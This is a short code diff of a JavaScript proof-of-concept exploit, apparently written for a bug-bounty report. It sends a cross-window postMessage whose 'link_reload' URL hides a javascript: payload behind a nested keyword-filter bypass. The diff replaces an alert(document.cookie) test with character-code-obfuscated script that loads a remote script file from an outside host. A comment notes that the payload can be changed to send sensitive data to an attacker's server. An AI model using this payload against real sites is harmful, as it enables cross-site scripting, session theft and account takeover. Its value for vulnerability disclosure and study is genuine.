@@ -31,7 +31,7 @@ function openWin(){
             if (window.attackSuccess) {
                 clearInterval(interval)
             } else {
-                var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
+                var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:document.write(String.fromCharCode(60,104,116,109,108,62,60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,62,60,47,115,99,114,105,112,116,62,60,47,104,116,109,108,62))"});
                 h1Win.postMessage(data,"*");
 		window.attackSuccess = true;
             }
@@ -39,7 +39,7 @@ function openWin(){
     }
 
 function sendMessage(){
-	var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
+	var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:document.write(String.fromCharCode(60,104,116,109,108,62,60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,62,60,47,115,99,114,105,112,116,62,60,47,104,116,109,108,62))"});
 	//you can change the url payload for send back some sensitive information to the attacker's server
 	h1Win.postMessage(data,"*");
 	}
